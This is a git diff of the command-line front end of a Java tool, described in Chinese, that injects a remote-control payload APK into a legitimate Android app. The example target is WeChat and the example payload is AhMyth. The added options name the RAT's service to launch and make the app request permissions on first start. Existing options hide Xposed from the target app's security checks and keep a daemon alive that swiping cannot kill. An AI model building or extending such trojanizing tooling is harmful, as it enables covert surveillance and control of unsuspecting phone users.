@@ -25,11 +25,17 @@ public class App implements Runnable
 //    @Option(names = {"-x", "--hideXposed"}, description = "隐藏Xposed, 让app无法检测到Xposed(用来防止被注入的app安全检测), 默认为: True. ")
     private boolean hideXposed = true;
 
+    @Option(names = {"-o", "--enableOldSdk"}, description = "使用老版本的SDK声明, app在第一次启动时, 会提示系统给予对应的权限. 默认为: False ")
+    private boolean oldSdk = false;
+
     @Option(names = {"-d", "--enableDaemonService"}, description = "开启后台守候进程, 通过在通知栏驻留通知, 保证app不被杀死(上滑也杀不掉, 必须进设置停止, 会在地址栏留下通知), 默认为: False. ")
     private boolean enableDaemonService = false;
 
-    @Option(names = {"-p", "--packageName"}, description = "新生成的包名称, 例如 com.tencent.mm.hack. \n目前版本存在问题, 新包名不能和被注入app的包名相同, 会导致无法启动. 默认为: 原包名 + .a520apkbox . ")
-    private String packageName;
+    @Option(names = {"-p", "--newPackageName"}, description = "新生成的包名称, 例如 com.tencent.mm.hack. \n目前版本存在问题, 新包名不能和被注入app的包名相同, 会导致无法启动. 默认为: 原包名 + .a520apkbox . ")
+    private String newPackageName;
+
+    @Option(names = {"-s", "--payloadService"}, description = "远控apk中, 用来启动Service服务名称. 比如AhMyth, 启动的后台服务为 `ahmyth.mine.king.ahmyth.MainService`. ")
+    private String payloadService;
 
     @Parameters(index = "0", description = "需要注入的apk文件. ", arity = "1")
     private String hackApkFilePath;
@@ -69,8 +75,16 @@ public class App implements Runnable
 
         getPayloadApkInfo();
 
-        if (packageName != null) {
-            Config.newPackageName = packageName;
+        if (newPackageName != null) {
+            Config.newPackageName = newPackageName;
+        }
+
+        if (payloadService != null){
+            Config.payloadApkMainServiceName = payloadService;
+        }
+
+        if (oldSdk){
+            Config.apkBoxUseOldSdk = true;
         }
 
         startHackApk();
